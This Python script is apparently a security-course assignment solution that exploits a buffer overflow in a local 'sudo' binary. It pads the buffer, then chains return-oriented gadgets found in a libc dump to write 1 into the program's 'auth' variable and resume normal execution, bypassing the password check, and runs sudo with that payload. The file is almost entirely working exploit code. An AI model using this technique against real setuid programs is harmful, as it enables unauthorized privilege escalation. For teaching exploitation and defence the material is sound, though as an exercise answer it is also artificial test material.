import os, sys

import addresses
import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'
HEX_BASE = 16


def get_arg():
    search = GadgetSearch(LIBC_DUMP_PATH)
    # NOTES:
    # 1. Use `addresses.AUTH` to get the address of the `auth` variable.
    # 2. Don't write addresses of gadgets directly - use the search object to
    #    find the address of the gadget dynamically.

    auth_addr = addresses.AUTH
    normal_ret_addr = addresses.NORMAL_RET # the original retrun address from the function check_password

    pop_edx_addr = int(search.find_format('pop edx')[1], HEX_BASE)
    xor_eax_addr = int(search.find_format('xor eax, eax')[1], HEX_BASE)
    inc_eax_addr = int(search.find_format('inc eax')[1], HEX_BASE)
    mov_edx_adrr = int(search.find_format('mov [edx], eax')[1], HEX_BASE)

    buff = 'a' * (0x49 - len("thisisasalt")) # same as in q1
    old_ebp = 'b' * 4 # same as in q1
    buffer_part = buff + old_ebp

    # for more deatils on the order of the commands see q3.txt
    shellcode = addresses.address_to_bytes(pop_edx_addr) + addresses.address_to_bytes(auth_addr) + \
    			addresses.address_to_bytes(xor_eax_addr) + addresses.address_to_bytes(inc_eax_addr) +\
    			addresses.address_to_bytes(mov_edx_adrr) + addresses.address_to_bytes(normal_ret_addr)
    return buffer_part + shellcode

def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
